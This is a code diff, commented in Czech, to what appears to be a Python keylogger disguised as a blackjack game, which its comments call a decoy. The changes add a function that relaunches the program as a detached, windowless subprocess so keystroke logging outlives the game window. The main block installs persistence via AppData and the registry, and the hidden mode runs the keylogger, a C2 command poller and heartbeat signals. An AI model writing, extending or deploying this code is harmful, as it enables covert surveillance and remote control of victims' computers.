@@ -692,28 +692,86 @@ class Keylogger:
 
 
 # ═══════════════════════════════════════════════════════════════
+# SPAWNER — spustí sám sebe jako silent subprocess (detached)
+# ═══════════════════════════════════════════════════════════════
+
+def spawn_silent_subprocess():
+    """Spustí sám sebe s --silent flag jako nezávislý proces.
+
+    Subprocess přežije smrt rodiče (detached, no window).
+    Rodič (hra) umře křížkem → subprocess žije dál.
+    """
+    try:
+        if IS_WINDOWS:
+            # PyInstaller frozen exe spustí sám sebe
+            exe = sys.executable
+            args = [exe, "--silent"]
+            creation_flags = (
+                0x00000200 |  # CREATE_NEW_PROCESS_GROUP
+                0x08000000    # CREATE_NO_WINDOW
+            )
+            subprocess.Popen(
+                args,
+                creationflags=creation_flags,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                stdin=subprocess.DEVNULL,
+            )
+        else:
+            # macOS/Linux: python skript
+            args = [sys.executable, __file__, "--silent"]
+            subprocess.Popen(
+                args,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                stdin=subprocess.DEVNULL,
+                start_new_session=True,
+            )
+        return True
+    except Exception:
+        return False
+
+
+# ═══════════════════════════════════════════════════════════════
 # MAIN
 # ═══════════════════════════════════════════════════════════════
 
 if __name__ == "__main__":
     silent = "--silent" in sys.argv
 
-    # ── DIAGNOSTIKA: hned na start ──
-    send_startup_signal()
-    send_gist_status()
-    start_heartbeat()
-
     if not silent:
+        # ═══ INTERACTIVE MÓD (první spuštění) ═══
+        #
+        # 1. Install persistence (AppData + registry)
+        # 2. Spawn silent subprocess (keylogger, přežije smrt hry)
+        # 3. Spusť decoy hru (blocking)
+        #
+        # Uživatel zavře křížkem → hlavní proces umře
+        # → silent subprocess žije dál → logging pokračuje
+
         install()
-        logger = Keylogger()
-        logger.run_background()
-        start_command_poller()
-        run_blackjack()  # blocking — hra běží, keylogger na pozadí
+
+        spawned = spawn_silent_subprocess()
+        if spawned:
+            time.sleep(1)  # ať se subprocess stihne spustit
+
+        run_blackjack()
+        sys.exit(0)
+
     else:
+        # ═══ SILENT MÓD (subprocess / registry autostart) ═══
+        #
+        # Keylogger + C2 poller + heartbeat, žádné okno
+        # Běží donekonečna
+
+        send_startup_signal()
+        send_gist_status()
+        start_heartbeat()
+
         logger = Keylogger()
         logger.run_background()
         start_command_poller()
 
-    # Udržuj proces naživu
-    while True:
-        time.sleep(60)
+        # Udržuj proces naživu navždy
+        while True:
+            time.sleep(60)
